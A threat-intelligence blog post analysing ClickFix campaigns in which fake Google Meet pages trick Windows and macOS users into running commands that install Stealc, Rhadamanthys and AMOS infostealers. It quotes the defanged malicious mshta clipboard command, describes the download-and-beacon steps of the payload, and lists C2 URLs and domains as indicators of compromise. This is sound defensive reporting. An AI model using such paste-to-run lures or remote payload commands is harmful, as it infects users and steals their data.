# ClickFix tactic: The Phantom Meet Infostealer Campaign

- **Source :** sekoia
- **URL :** https://www.sekoia.com/blog/clickfix-tactic-the-phantom-meet
- **Date :** 2024-10-17

---

## Context

In May 2024, a new social engineering tactic called ClickFix emerged, featuring a ClearFake cluster that the Sekoia Threat Detection & Research (TDR) team closely monitored and analysed in a private report entitled _FLINT 2024-027 - New widespread ClearFake variant abuses PowerShell and clipboard_. This tactic involves displaying fake error messages in web browsers to deceive users into copying and executing a given malicious PowerShell code, finally infecting their systems.

Proofpoint researchers, who named this tactic ClickFix, reported1 that the initial access broker TA571 leveraged it in email [phishing campaigns](/blog/phishing-campaigns-i-paid-twice-targeting-booking-com-hotels-and-customers) since March 2024. These campaigns primarily used HTML files disguised as Word documents, displaying a fake error window that prompts users to install malware such as Matanbuchus, DarkGate, or NetSupport RAT via a PowerShell script.

In recent months, multiple malware distribution campaigns have leveraged the ClickFix lure to spread Windows and macOS infostealers, botnets, and remote access tools. This is in line with the growing, ongoing trend of distributing malware through the drive-by download technique. Sekoia analysts assess that several intrusion sets recently adopted this tactic, presumably to evade antivirus software scanning and browser security features, aiming to improve attackers’ infection rates. 

In this blog post, we provide a **chronological overview of the observed ClickFix campaigns**. We further share technical details about a **ClickFix cluster that uses fake Google Meet video conference pages to distribute infostealers** , targeting both Windows and macOS systems. Sekoia analysts successfully associated this cluster impersonating Google Meet with two **cybercrime groups: "_Slavic Nation Empire (SNE)"_ and "_Scamquerteo_ "**. These groups are sub-teams of the cryptocurrency scam teams "_Marko Polo_ " and "_CryptoLove_ ", respectively.

## ClickFix in the wild

### Chronological overview of ClickFix campaigns

Since June 2024, various open source reports and Sekoia investigations have revealed malware distribution campaigns using the emerging ClickFix tactic. The following figure provides a chronological overview of these campaigns. It highlights the malware families involved and the distribution techniques used, which include phishing emails, compromised websites, and distribution infrastructures.

![Overview of malware distribution campaigns using the ClickFix tactic. Source: Sekoia Blog](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a58e3e6167cebbf7a135_6a92a23cadf0bb92a650de6e_6a2a7e67858397422f50d48c.webp)

Overview of malware distribution campaigns using the ClickFix tactic. Source: Sekoia Blog

 _Figure 1. Overview of malware distribution campaigns using the ClickFix tactic_

Here are some examples of malicious websites that impersonate Google Chrome, Facebook, PDFSimpli, and reCAPTCHA, using the ClickFix social engineering tactic.

![Examples of malicious websites impersonating Google Chrome, Facebook, PDFSimpli, and reCAPTCHA, using the ClickFix tactic](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a58e3e6167cebbf7a12b_6a92a23e2b0ef7af46bc7a80_6a2a7e67858397422f50d492.webp)

Examples of malicious websites impersonating Google Chrome, Facebook, PDFSimpli, and reCAPTCHA, using the ClickFix tactic

 _Figure 2. Examples of malicious websites impersonating Google Chrome, Facebook, PDFSimpli, and reCAPTCHA, using the ClickFix tactic_

### Victimology of ClickFix clusters

While many of these campaigns reportedly aim to broadly target multiple sectors - using websites compromised by ClearFake or through extensive phishing efforts - some are designed to target specific verticals.

For instance, Proofpoint identified2 a ClickFix cluster targeting transport and logistics companies in North America from at least May to August 2024. This campaign uses websites that impersonate transport and fleet operations management software.

Additionally, the GitHub issues campaign mainly targeted developers to spread Lumma Stealer by falsely reporting security vulnerabilities, thereby impacting thousands of public code repositories and exploiting developers’ trust in GitHub notifications. The goal of this large-scale operation was likely to opportunistically gather a significant amount of sensitive developer data, which can be used for more targeted attacks in the future. 

Recent campaigns uncovered by Sekoia analysts appear to continuously target both businesses and individuals, using opportunistic lures such as fake Google Meet pages and Facebook groups.

## Investigation of ClickFix clusters

The following section provides a detailed analysis of one of the clusters discovered by Sekoia analysts.

## Fake Google Meet pages and technical issues

By pivoting on the text elements in ClickFix messages displayed to users, such as the phrase “ _Press the key combination_ ” or “ _CTRL+V_ ”, we discovered several websites masquerading as the homepage of a Google Meet video conference. The sites displayed pop-up windows falsely indicating problems with the microphone and headset, as shown on the figure below.

![Fake homepage of a Google Meet video conference displaying a pop-up faking technical issues \(ClickFix\)](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a58e3e6167cebbf7a131_6a92a23a32517fc4025f8c2b_6a2a7e66858397422f50d484.webp)

Fake homepage of a Google Meet video conference displaying a pop-up faking technical issues (ClickFix)

_Figure 3. Fake homepage of a Google Meet video conference displaying a pop-up faking technical issues (ClickFix)_

We identified the following domain names and IP address that we attribute to this cluster with high confidence:

_meet[.]google[.]us-join[.]com_  
 _meet[.]googie[.]com-join[.]us_  
 _meet[.]google[.]com-join[.]us_  
 _meet[.]google[.]web-join[.]com_  
 _meet[.]google[.]webjoining[.]com_  
 _meet[.]google[.]cdm-join[.]us_  
 _meet[.]google[.]us07host[.]com_  
 _googiedrivers[.]com_  
  
 _77.221.157[.]170_  
---  
  
The phishing URLs imitate legitimate ones with the same pattern for the meeting identifier, _e.g._ :

_hxxps://meet[.]google[.]com-join[.]us/wmq-qcdn-orj_  
 _hxxps://meet[.]google[.]us-join[.]com/ywk-batf-sfh_  
 _hxxps://meet[.]google[.]us07host[.]com/coc-btru-ays_  
 _hxxps://meet[.]google[.]webjoining[.]com/exw-jfaj-hpa_  
---  
  
### Windows users targeted with Stealc and Rhadamanthys

For Windows users, clicking on the “Try Fix” button results in copying the following command into the clipboard:

_mshta hxxps://googIedrivers[.]com/fix-error_  
---  
  
The _fix-error_ file (SHA256: _92a8cc4e385f170db300de8d423686eeeec72a32475a9356d967bee9e3453138_) is an HTML file containing an HTML Application (HTA) which itself contains an obfuscated VBScript. Using a Python script3, we deobfuscated it and obtained the following VBScript.

![Deobfuscated VBS script distributed by the cluster of fake Google meetings. Source: Sekoia.io Blogpost about ClickFix tactic](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a58e3e6167cebbf7a138_6a92a23e692919148899405d_6a2a7e67858397422f50d495.webp)

Deobfuscated VBS script distributed by the cluster of fake Google meetings. Source: Sekoia.io Blogpost about ClickFix tactic

 _Figure 4. Deobfuscated VBS script distributed by the cluster of fake Google meetings_

Upon execution, the VBS script performs the following actions:

  1. It terminates its parent process (_mshta.exe_).
  2. It downloads two executables (_stealc.exe_ and _ram.exe_) using _bitsadmin_. After a two-seconds delay, it notifies the C2 server (_webapizmland[.]com_) about the success or failure of running the executables.
  3. It retrieves the victim’s public IP address using the service _api.ipify[.]org_ and sends it to the C2 server along the execution status.



The two executables _stealc.exe_ (SHA256: _a834be6d2bec10f39019606451b507742b7e87ac8d19dc0643ae58df183f773c_) and _ram.exe_ (SHA256: _2853a61188b4446be57543858adcc704e8534326d4d84ac44a60743b1a44cbfe_)are the Stealc and Rhadamanthys payloads respectively, both protected by the HijackLoader crypter.

In this campaign, the Stealc C2 server is _“hxxp://95.182.97[.]58/84b7b6f977dd1c65.php_ ” and the Rhadamanthys C2 server is “ _hxxp://91.103.140[.]200:9078/3936a074a2f65761a5eb8/6fmfpmi7.fwf4p_ ”. Both IP addresses were already known by our CTI database following the Sekoia.io C2 Trackers monitoring routine, as we proactively track the C2 infrastructure of these two infostealer families sold as Malware-as-a-Service.

Notably, the name of the Stealc botnet "_sneprivate24_ " suggests that the traffer4 group "_Slavic Nation Empire_ (SNE)" was behind this campaign. Further details about this association can be found in the section "Traffers teams operating this ClickFix cluster".

### MacOS users targeted by AMOS Stealer

For macOS users, clicking on the “Try Fix” button results in downloading the file _Launcher_v1.94.dmg_ (SHA256: _94379fa0a97cc2ecd8d5514d0b46c65b0d46ff9bb8d5a4a29cf55a473da550d5_), using the following HTTP requests:

  1. A GET request to _hxxps://carolinejuskus[.]com/kusaka.php?call=launcher_ , where the server responds with a second URL in the HTTP header Location.
  2. A GET request to _hxxps://carolinejuskus[.]com/f9dfbcf6a999/7cc2f5dc3c76/load.51f8527e20dcb05ffd8586b853937a8a.php?call=launcher_ , which returns the malicious payload.



We identified the payload _Launcher_v1.94.dmg_ (SHA256: 94379fa0a97cc2ecd8d5514d0b46c65b0d46ff9bb8d5a4a29cf55a473da550d5) as AMOS Stealer, which communicates with its C2 server at “ _hxxp://85.209.11[.]155/joinsystem_ ”.

Sekoia actively tracks this infrastructure characterised by the _/kusaka.php_ endpoint. Since at least May 2024, this endpoint is used in campaigns redirecting users from malicious websites to download the AMOS Stealer. It is likely used to protect the payload from unwanted traffic, such as downloads by bots or scans by security products.

We identified the following domain names associated with this macOS malware distribution infrastructure:

alienmanfc6[.]com  
apunanwu[.]com  
bowerchalke[.]com  
carolinejuskus[.]com  
cautrucanhtuan[.]com  
cphoops[.]com  
dekhke[.]com  
iloanshop[.]com  
kansaskollection[.]com  
lirelasuisse[.]com  
mdalies[.]com  
mensadvancega[.]com  
mishapagerealty[.]com  
modoodeul[.]com  
pabloarruda[.]com  
pakoyayinlari[.]com  
patrickcateman[.]com  
phperl[.]com  
stonance[.]com  
utv4fun[.]com  
---  
  
Given the variety of initial malicious websites redirecting to this infrastructure, we assess with high confidence that it is shared among multiple threat actors. They collaborate within a centralised traffers team to share certain resources, including this infrastructure and the AMOS Stealer, which is also sold as Malware-as-a-Service.

### Traffers teams operating this ClickFix cluster

#### Slavic Nation Empire (SNE): a sub-group of Marko Polo

The attacker’s server hosts an interesting JavaScript code at _hxxp://77.221.157[.]170:3004/server.js_ 5, which is a backend code related to this distribution infrastructure. In brief, this JavaScript connects to a MongoDB database to retrieve _worker_ ’s information, and sends statistics to two Telegram bots when users visited the malicious Google Meet websites and successfully downloaded the payload. We would like to thank the cybersecurity researcher Karol Paciorek from the CSIRT KNF team for sharing this discovery with us6.

The following is an excerpt of the JavaScript code that includes the message sent to the two Telegram bots.

![Excerpt of attacker’s backend code exfiltrating data to Telegram bots, used by the ClickFix cluster “fake Google meetings”](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a58e3e6167cebbf7a12e_6a92a23fa2f46752fd00f3ec_6a2a7e67858397422f50d498.webp)

Excerpt of attacker’s backend code exfiltrating data to Telegram bots, used by the ClickFix cluster “fake Google meetings”

 _Figure 5. Excerpt of attacker’s backend code exfiltrating data to Telegram bots, used by the ClickFix cluster “fake Google meetings”_

The attacker uses this backend to track compromises and visits for this ClickFix cluster.

By extracting the chat logs of the Telegram bots “ _#SNE | GMEET OTSTUK_ ” using the Telegram API, we discovered a discussion between _sparkhash_ , the alleged developer of this ClickFix cluster, and the traffer _Alexmen_. Our investigation revealed that both threat actors are members of the traffers team "_Slavic Nation Empire (SNE)_ ", which is a sub-team of the cryptocurrency scam team "_Marko Polo_ ".

![Extract of a Telegram bot discussion between the alleged operator and a possible affiliate of the cluster “fake Google Meet pages”. Source: Sekoia Threat Detection and Research Team](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a58e3e6167cebbf7a13b_6a92a23bcd1cab63350c6b93_6a2a7e67858397422f50d489.webp)

Extract of a Telegram bot discussion between the alleged operator and a possible affiliate of the cluster “fake Google Meet pages”. Source: Sekoia Threat Detection and Research Team

 _Figure 6. Extract of a Telegram bot discussion between the alleged operator and a possible affiliate of the cluster “fake Google Meet pages”_

Cybercriminals frequently use Telegram bots to monitor their activities, especially when this involves working in a team and collaborating with affiliates (traffers/workers).

Based on our analysis of this cluster’s activities and the messages shared between the threat actors operating and using it, Sekoia analysts advance the following hypothesis:

  * The threat actor **_sparkhash_ deployed the GMeet cluster for the benefit of the traffers team"_Slavic Nation Empire (SNE)_ "** in charge of generating traffic to this cluster.


  * This team of traffers could be **administered by the threat actor _Alexmen_** who oversees the**distribution clusters activities** and possibly manages infostealers licences, relying on external services.


  * The **traffers** , also known as affiliates or workers, **spread the malicious URLs to potential victims, redirecting them to this cluster**. For example, the cybercriminal going by the handle _web3huntereth_ may have infected a victim, or himself as part of a test, in Poland, as indicated by the download statistics from the Telegram bot.



TDR confidently associate this **cluster impersonating Google Meet with the traffers team “ _Slavic Nation Empire (SNE)_** ”, also known as “ _Slavice Nation Land_ ”. This team provides its members **a comprehensive kit for sophisticated scams** targeting users of cryptocurrency assets, Web3 applications, decentralised finance, and NFT. The kit includes landing pages impersonating software and video conferencing webpages, along with infostealers, drainers, and automation tools to coordinate attacks.

The traffers team "_Slavic Nation Empire (SNE)_ " is a sub-group of the **cryptocurrency scam team “ _Marko Polo_ ”** and part of the Russian-speaking cybercrime ecosystem. We would like to thank the cybersecurity researcher g0njxa for sharing some valuable hints on these groups with us. Additionally, Recorded Future researchers have published two reports detailing Marko Polo campaigns78.

#### Scamquerteo Team: a sub-group of CryptoLove

Moreover, we discovered that the traffers team "_Scamquerteo_ " also used this ClickFix cluster impersonating Google Meet, specifically using the FQDN "_meet[.]google[.]webjoining[.]com_ " to spread malware. The traffers team "**_Scamquerteo Team_** " is a sub-group of the **cryptocurrency scam team “ _CryptoLove_ ”** and part of the Russian-speaking cybercrime ecosystem.

During our investigation, we were able to interact with their Telegram bot, which manages operating the traffers activities for the fake Google Meet cluster, as shown by the following figure.

![Interaction with the Scamquerteo's Telegram bot to generate a fake Google Meet page. Source: Sekoia TDR Team](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a58e3e6167cebbf7a128_6a92a2409d3b9ef4d8bba141_6a2a7e67858397422f50d49c.webp)

Interaction with the Scamquerteo's Telegram bot to generate a fake Google Meet page. Source: Sekoia TDR Team

 _Figure 7. Interaction with the Scamquerteo's Telegram bot to generate a fake Google Meet page_

Both traffers teams, "_Slavic Nation Empire (SNE)_ " and "_Scamquerteo_ ", **use the same ClickFix template** that impersonates Google Meet. This discovery suggests that these teams**share materials** , also known as "landing project", as well as **infrastructure**.

Sekoia analysts assess with medium confidence that **both teams use the same cybercrime service to supply them with this fake Google Meet cluster** , that remains unknown at the time of writing. Additionally, it is likely that a third party manages their infrastructure or registers their domain names.

## Conclusion

ClickFix is an **emerging social engineering tactic first observed in 2024**. As of September 2024, **several intrusion sets already adopted it** to widely distribute malware through email phishing campaigns, compromised websites, and distribution infrastructures.

The ClickFix tactic **deceives users into downloading and running malware** on their machines **without involving a web browser for download or requiring manual file execution**. It makes it possible to bypass web browser security features, such as Google Safe Browsing, and to appear less suspicious to unsuspecting corporate and individual users.

The ClickFix cluster analysed in this blog post employs a decoy that could be particularly **devastating in campaigns targeting organisations that use Google Workspace** , especially Google Meet. The investigation into the traffers team distributing this cluster suggests that it primarily targets cryptocurrency assets, Web3 applications, decentralised finance, and NFT users. However, we believe that similar social engineering techniques could be employed in other malware distribution campaigns.

## Cluster ClickFix IoCs & Technical details

The list of IoCs is available on [Sekoia.io GitHub repository](https://github.com/SEKOIA-IO/Community/blob/main/IOCs/clickfix_fake_google_meet/clickfix_fake_google_meet_iocs_20241017.csv).

## Fake Google Meet pages and associated infection chain

**Phishing domains impersonating Google Meet:**

_meet[.]google[.]us-join[.]com_  
 _meet[.]googie[.]com-join[.]us_  
 _meet[.]google[.]com-join[.]us_  
 _meet[.]google[.]web-join[.]com_  
 _meet[.]google[.]webjoining[.]com_  
 _meet[.]google[.]cdm-join[.]us_  
 _meet[.]google[.]us07host[.]com_  
 _googiedrivers[.]com_  
  
 _77.221.157[.]170_  
---  
  
**Phishing URLs impersonating Google Meet pages:**

_hxxps://meet[.]google[.]com-join[.]us/wmq-qcdn-orj_  
 _hxxps://meet[.]google[.]us-join[.]com/ywk-batf-sfh_  
 _hxxps://meet[.]google[.]us07host[.]com/coc-btru-ays_  
 _hxxps://meet[.]google[.]webjoining[.]com/exw-jfaj-hpa_  
---  
  
**Infection chains:**

_googiedrivers[.]com_ (payload download)  
_us18web-zoom[.]us_ (payload download)  
_webapizmland[.]com_ (fingerprint data exfiltration)  
_carolinejuskus[.]com_ (macOS payload download)  
_95.182.97[.]58_ (Stealc C2)  
_91.103.140[.]200_ (Rhadamanthys C2)  
_85.209.11[.]155_ (AMOS Steaker C2)  
_hxxps://googIedrivers[.]com/fix-error_ (payload download)  
_hxxps://us18web-zoom[.]us/stealc.exe_ (payload download)  
_hxxps://us18web-zoom[.]us/ram.exe_ (payload download)  
_hxxps://webapizmland[.]com/api/cmdruned_ (payload download)  
_hxxp://95.182.97[.]58/84b7b6f977dd1c65.php_ (Stealc C2)  
_hxxp://91.103.140[.]200:9078/3936a074a2f65761a5eb8/6fmfpmi7.fwf4p_(Rhadamanthys C2)  
_hxxps://carolinejuskus[.]com/kusaka.php?call=launcher_ (macOS payload download)  
_hxxp://85.209.11[.]155/joinsystem_ (AMOS Stealer C2)  
_92a8cc4e385f170db300de8d423686eeeec72a32475a9356d967bee9e3453138_ (malicious HTML payload)  
_a834be6d2bec10f39019606451b507742b7e87ac8d19dc0643ae58df183f773c_ (Stealc payload)  
_2853a61188b4446be57543858adcc704e8534326d4d84ac44a60743b1a44cbfe_ (Rhadamanthys payload)  
_94379fa0a97cc2ecd8d5514d0b46c65b0d46ff9bb8d5a4a29cf55a473da550d5_ (AMOS Stealer payload)

**AMOS Stealer distribution infrastructure:**

alienmanfc6[.]com  
apunanwu[.]com  
bowerchalke[.]com  
carolinejuskus[.]com  
cautrucanhtuan[.]com  
cphoops[.]com  
dekhke[.]com  
iloanshop[.]com  
kansaskollection[.]com  
lirelasuisse[.]com  
mdalies[.]com  
mensadvancega[.]com  
mishapagerealty[.]com  
modoodeul[.]com  
pabloarruda[.]com  
pakoyayinlari[.]com  
patrickcateman[.]com  
phperl[.]com  
stonance[.]com  
utv4fun[.]com  
---  
  
## Additional clusters allegedly associated to the same traffers teams

Sekoia.io TDR uncovered **a large-scale malware distribution infrastructure allegedly associated with several traffers team** which use the fake Google Meet cluster. This infrastructure was unveiled based on passive DNS, Whois lookups, and HTML similarities, such as title, text, favicon and resources.

This infrastructure includes webpages impersonating platforms like Zoom, video games, office software, and fake Web3 applications, which spread Stealc, Rhadamanthys, and AMOS Stealer to Web3 gamers.

  * **Zoom cluster**



us01web-zoom[.]us  
us03web-zoom[.]us  
us07web-zoom[.]us  
us08web-zoom[.]us  
us09web-zoom[.]us  
us10web-zoom[.]us  
us18web-zoom[.]us  
us30web-zoom[.]us  
us40web-zoom[.]us  
us45web-zoom[.]us  
us50web-zoom[.]us  
us60web-zoom[.]us  
us70web-zoom[.]us  
us77web-zoom[.]us  
us80web-zoom[.]us  
us85web-zoom[.]us  
us95web-zoom[.]us| us004web-zoom[.]us  
us005web-zoom[.]us  
us006web-zoom[.]us  
us007web-zoom[.]us  
us008web-zoom[.]us  
us050web-zoom[.]us  
us055web-zoom[.]us  
us500web-zoom[.]us  
us505web-zoom[.]us  
us555web-zoom[.]us  
  
us002webzoom[.]us  
us003webzoom[.]us  
  
us4web-zoom[.]us  
us5web-zoom[.]us  
us6web-zoom[.]us| us01web[.]us  
us03web[.]us  
us08web[.]us  
us09web[.]us  
us15web[.]us  
us20web[.]us  
us40web[.]us  
us50web[.]us  
us55web[.]us  
  
web05-zoom[.]us  
webroom-zoom[.]us  
---|---|---  
  
  * **PDF reader cluster (office software)**



doculuma[.]com  
fatoreader[.]com  
fatoreader[.]net  
gamascript[.]com  
verdascript[.]com  
veriscroll[.]com  
---  
  
  * **Lunacy / Calipso (fake video game)**



calipsoproject[.]com  
lunacy3[.]com  
lunacy4[.]com  
projectcalipso[.]com  
thecalipsoproject[.]com  
web3dev[.]buzz  
---  
  
  * **ULTIMATE / BATTLEFORGE (fake video game)**



battleforge[.]cc  
battleultimate[.]xyz  
mybattleforge[.]xyz  
myultimate[.]xyz  
playbattleforge[.]org  
playbattleforge[.]xyz  
playultimate[.]xyz  
tooldream[.]live  
ultimategame[.]xyz  
ultimateplay[.]xyz  
---  
  
  * **RAGON GAME (fake video game)**



argongame[.]com  
darkblow[.]com  
missingfrontier[.]com  
nightpredators[.]com  
riotrevelry[.]com  
thewatch[.]com  
us12web[.]us  
web3dev[.]buzz  
webjoining[.]com  
---  
  
  * **Web3 web browser**



sleipnirbrowser[.]org  
sleipnirbrowser[.]xyz  
---  
  
  * **Cozy World Metaverse**



cozyland[.]xyz  
cozymeta[.]com  
cozymeta[.]fun  
cozymeta[.]xyz  
cozyweb3[.]com  
cozyworld[.]io  
worldcozy[.]com  
---  
  
  * **NGT Studio**



ngtmeta[.]io  
ngtmetaland[.]io  
ngtmetaweb[.]com  
ngtproject[.]com  
ngtstudio[.]io  
ngtstudio[.]online  
ngtverse[.]org  
night-support[.]xyz  
nightstudio[.]io  
nightstudioweb[.]xyz  
---  
  
  * **Nortex Web3 Messaging App**



lastnuggets[.]com  
mor-dex[.]world  
mordex[.]blog  
mordex[.]digital  
mordex[.]homes  
nor-tex[.]eu  
nor-tex[.]pro  
nor-tex[.]world  
nor-tex[.]xyz  
nort-ex[.]eu  
nort-ex[.]lol  
nort-ex[.]world  
nortex-app[.]pro  
nortex-app[.]us  
nortex-app[.]xyz  
nortex[.]app  
nortex[.]blog  
nortex[.]digital  
nortex[.]life  
nortex[.]limited  
nortex[.]lol  
nortex[.]uk  
nortexapp[.]com  
nortexapp[.]digital  
nortexapp[.]io  
nortexapp[.]me  
nortexapp[.]pro  
nortexapp[.]xyz  
nortexmessenger[.]blog  
nortexmessenger[.]digital  
nortexmessenger[.]pro  
nortexmessenger[.]us  
---